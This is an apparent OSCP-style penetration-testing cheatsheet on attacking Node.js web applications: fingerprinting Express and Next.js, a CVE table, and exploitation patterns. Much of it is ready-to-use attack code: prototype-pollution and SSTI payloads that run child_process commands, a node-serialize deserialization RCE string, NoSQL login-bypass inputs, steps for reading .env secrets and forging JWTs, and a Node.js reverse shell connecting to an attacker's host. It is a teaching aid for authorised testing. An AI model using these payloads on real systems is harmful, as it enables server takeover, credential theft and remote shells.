# Node.js

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Framework-specific](#5-framework-specific)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `X-Powered-By: Express` | Express.js |
| `X-Powered-By: Next.js` | Next.js |
| `Server: Kestrel` | ASP.NET Core (NOT Node) |
| `Set-Cookie: connect.sid=...` | Express session |
| `Set-Cookie: __next` | Next.js |
| `ETag: W/"..."` + `X-Powered-By: Express` | Express with static |
| `Set-Cookie: io=...` | Socket.IO session |

### 1.2 Error messages

| Error text | Framework / runtime |
|------------|---------------------|
| `Cannot GET /path` | Express (default 404) |
| `TypeError: Cannot read property` | Node.js |
| `SyntaxError: Unexpected token` | V8 parse error |
| `ECONNREFUSED` | Node.js net module |
| `ReferenceError: ... is not defined` | Node.js |
| `at Object.<anonymous> (/app/server.js:12:5)` | Stack trace with file path |

### 1.3 File paths and structure

| Path | Purpose |
|------|---------|
| `/package.json` | Dependencies + scripts |
| `/package-lock.json` | Exact versions |
| `/node_modules/` | Installed modules (large) |
| `/server.js`, `/app.js`, `/index.js` | Entry points |
| `/routes/`, `/views/`, `/public/` | Express structure |
| `/.env` | Creds, API keys |

---

## 2. Enumeration

### 2.1 Common files

```bash
curl -s http://<TARGET>/package.json
curl -s http://<TARGET>/package-lock.json
curl -s http://<TARGET>/.env
curl -s http://<TARGET>/server.js
curl -s http://<TARGET>/app.js
```

### 2.2 Version fingerprinting

```bash
# Express version
curl -sI http://<TARGET>/ | grep -i x-powered-by

# Node.js version (if error page leaks)
curl -s http://<TARGET>/nonexistent | grep -i "node"
```

### 2.3 npm audit

If you have `package.json` + `package-lock.json`:

```bash
npm audit --json > audit.json
# Or use retire.js
retire --path /path/to/app --outputformat json
```

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2024-21534 | jsonpath-plus < 10.0.0 | RCE via `$eval` | https://nvd.nist.gov/vuln/detail/CVE-2024-21534 |
| CVE-2024-29415 | ip <= 2.0.1 | SSRF via isPublic check bypass | https://nvd.nist.gov/vuln/detail/CVE-2024-29415 |
| CVE-2023-42282 | ip < 2.0.1 | SSRF via isPublic | https://nvd.nist.gov/vuln/detail/CVE-2023-42282 |
| CVE-2021-44906 | minimist <= 1.2.5 | Prototype pollution | https://nvd.nist.gov/vuln/detail/CVE-2021-44906 |
| CVE-2024-29041 | Express < 4.19.2 | Open redirect in `res.location` | https://nvd.nist.gov/vuln/detail/CVE-2024-29041 |
| CVE-2025-27152 | axios <= 1.7.9 | SSRF via absolute URL | https://nvd.nist.gov/vuln/detail/CVE-2025-27152 |
| CVE-2024-4367 | PDF.js <= 4.1.392 | RCE via `isEvalSupported` | https://nvd.nist.gov/vuln/detail/CVE-2024-4367 |

---

## 4. Exploitation patterns

### 4.1 Prototype pollution

Node.js merges user input into objects with dangerous functions (`lodash.merge`, `jQuery.extend`, `Object.assign` via deep merge).

**Payload (query string):**

```text
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
?__proto__.isAdmin=true
```

**Payload (JSON body):**

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**RCE via prototype pollution (child_process):**

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/environ", "env": {"EVIL": "console.log(require('child_process').execSync('id').toString())//"}}}
```

### 4.2 RCE via eval / Function

```javascript
eval(userInput)
new Function(userInput)()
setTimeout(userInput, 0)
setInterval(userInput, 0)
```

### 4.3 SSTI in template engines

**EJS (<= 3.1.6):** CVE-2022-29078 (RCE via `settings[view options][outputFunctionName]`)

```text
?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s
```

**Pug / Jade:**

```text
#{7*7}    -> 49
#{process.mainModule.require('child_process').execSync('id')}
```

**Handlebars (<= 4.7.7):** CVE-2021-23369

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Nunjucks:** similar to Jinja2, `{{7*7}}` works.

**Marko, Eta, doT:** each has its own syntax - check PayloadsAllTheThings.

### 4.4 Deserialization

- `node-serialize`: CVE-2017-5941 (IIFE in `_$$ND_FUNC$$_`)
- `serialize-to-js`: CVE-2017-5954 (via `Function`)
- `cryo`: CVE-2021-25946

**Payload (node-serialize):**

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}
```

### 4.5 NoSQL injection (MongoDB)

```javascript
// Login bypass
db.users.findOne({username: req.body.username, password: req.body.password})
// Payload: {"username": {"$ne": null}, "password": {"$ne": null}}

// $where injection
db.users.find({$where: "this.username == '" + input + "'"})
// Payload: ' || '1'=='1
```

See [MongoDB.md](../07 Databases/MongoDB.md) for details.

### 4.6 Command injection

Sinks:

```javascript
child_process.exec(cmd)         // shell=True equivalent
child_process.execSync(cmd)
child_process.spawn(cmd, {shell: true})
```

`exec` always uses a shell - any user input here is command injection.

### 4.7 SSRF via axios / node-fetch

```javascript
axios.get(req.query.url)
fetch(req.query.url)
```

Targets: cloud metadata (`http://169.254.169.254/`), internal services, `file://` (in some versions).

---

## 5. Framework-specific

### 5.1 Express

- `app.js` / `server.js` - entry
- `routes/` - route handlers
- `/package.json` - dependencies
- Default 404: `Cannot GET /path`
- Debug mode: `app.set('env', 'development')` - verbose errors

### 5.2 Next.js

- `/api/` - API routes
- `/_next/static/` - static assets
- `/api/__nextjs_original-stack-frame` - source maps (dev mode)
- CVE-2025-29927: middleware auth bypass via `x-middleware-subrequest` header

### 5.3 NestJS

- TypeScript-first
- `/api` - default prefix
- Swagger at `/api` if enabled

### 5.4 Socket.IO

- WebSocket + polling fallback
- `/socket.io/?EIO=4&transport=polling` - handshake
- Event injection if server-side handlers are not validated

---

## 6. Post-exploitation

### 6.1 Read config files

```text
/app/.env
/app/config.js
/app/config.json
/app/settings.js
/app/package.json
```

Look for: `JWT_SECRET`, `SESSION_SECRET`, `DB_URI`, `AWS_ACCESS_KEY_ID`.

### 6.2 JWT secret extraction

If you can read the `.env` or config, sign your own JWT:

```bash
# Decode JWT
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null

# Sign with HS256
python3 jwt_tool.py <token> -S hs256 -p "<SECRET>"
```

### 6.3 Node.js reverse shell

```javascript
(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(<LPORT>, "<LHOST>", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/;
})();
```

One-liner:

```bash
node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(<LPORT>,"<LHOST>",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
```

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the framework fingerprint (X-Powered-By, error page) that identifies Node.js.

> [!IMPORTANT]
> OSCP report: screenshot SSTI / prototype pollution detection and the RCE payload output.

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE (eval, template engine, deserialization chain).

---

## 8. References

- Node.js official docs: https://nodejs.org/docs/
- HackTricks - Node.js: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
- PayloadsAllTheThings - Prototype Pollution: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
- PayloadsAllTheThings - SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- CVE-2024-21534: https://nvd.nist.gov/vuln/detail/CVE-2024-21534
- CVE-2024-29415: https://nvd.nist.gov/vuln/detail/CVE-2024-29415
- CVE-2023-42282: https://nvd.nist.gov/vuln/detail/CVE-2023-42282
- CVE-2021-44906: https://nvd.nist.gov/vuln/detail/CVE-2021-44906
- CVE-2024-29041: https://nvd.nist.gov/vuln/detail/CVE-2024-29041
- CVE-2025-27152: https://nvd.nist.gov/vuln/detail/CVE-2025-27152
- CVE-2024-4367: https://nvd.nist.gov/vuln/detail/CVE-2024-4367

---